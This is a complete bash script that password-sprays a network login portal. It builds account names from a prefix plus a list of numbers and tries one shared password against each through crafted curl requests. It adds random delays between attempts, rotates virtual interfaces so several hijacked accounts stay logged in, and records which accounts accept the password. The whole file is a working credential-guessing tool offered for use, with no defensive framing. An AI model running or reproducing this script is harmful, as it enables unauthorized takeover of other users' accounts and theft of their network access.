#!/bin/bash

log_file_name="run.log"
numbers_file_name="numbers.txt"
success_number_file_name="success.txt"

host=$(cat host.txt)
account_prefix=$(cat account_prefix.txt)
password=$(cat password.txt)

interfaces=(
    "eth0"
    "vth0"
    "vth1"
    "vth2"
    "vth3"
    "vth4"
    "vth5"
)
current_if=""

log() {
    current_time=$(date "+%Y/%m/%d %T")
    echo "$current_time" "$1" >> "$log_file_name"
}

if [ ! -f "$numbers_file_name" ]; then
    log "Error: The numbers.txt file does not exist! Please generate it first."
    exit 0
fi

if [ ! -s "$numbers_file_name" ]; then
    log "Error: The numbers.txt file is empty! Please re-generate it."
    exit 0
fi

log_success () {
    current_time=$(date "+%Y/%m/%d %T")
    echo "$current_time" "$1" >> "$success_number_file_name"
}

choose_if() {
    log "Info: Choosing interface to login."
    for interface in "${interfaces[@]}"; do
        is_logged_in=$(bash get_interface_info.sh "$interface" | grep "yes")
        if [ -n "$is_logged_in" ]; then
            log "Info: Interface $interface up."
        else
            log "Info: Interface $interface down, ready to login."
            current_if="$interface"
            return
        fi
    done
    log "Info: All interfaces up."
    exit 0
}

choose_if

login() {
    curl "http://$host/login?DDDDD=$1&upass=$2&R1=0&R2=&R3=2&R6=0&para=00&0MKKey=123456&buttonClicked=&redirect_url=&err_flag=&username=&password=&user=&cmd=&Login=&v6ip=" \
        -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
        -H 'Accept-Language: zh-CN,zh;q=0.9' \
        -H 'Connection: keep-alive' \
        -H 'Referer: http://'"$host"'/a70.htm?isReback=1' \
        -H 'Upgrade-Insecure-Requests: 1' \
        -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36' \
        -i -s --interface "$3"
}

while IFS= read -r number; do
    sleep_time=$((RANDOM % 10 + 10)) # 10 - 20
    sleep $sleep_time

    sed -i '1d' "$numbers_file_name"

    account=$account_prefix$number

    log "Info: Using account: $account, password $password."
    response=$(login "$account" "$password" "$current_if")

    length=$(echo "$response" | grep -i 'Content-length:')

    if [ -n "$length" ]; then

        if [[ "$length" =~ Content-length:[[:space:]](3[0-9]*) ]]; then # login failed
            log "Info: Length: ${BASH_REMATCH[1]}, login failed."
            continue

        elif [[ "$length" =~ Content-length:[[:space:]](4[0-9]*) ]]; then # login success
            log "Info: Length: ${BASH_REMATCH[1]}, login success."
            log_success "$account"
            choose_if
            continue

        # login system error, seems like only happens on browser
        elif [[ "$length" =~ Content-length:[[:space:]](6[0-9]*) ]]; then
            log "Info: Length: ${BASH_REMATCH[1]}, login system error."
            continue
        else
            log "Error: Unknown content-length: ${length:16}."
        fi

    else
        log "Error: No content-length header found: $response"
    fi

done < "$numbers_file_name"
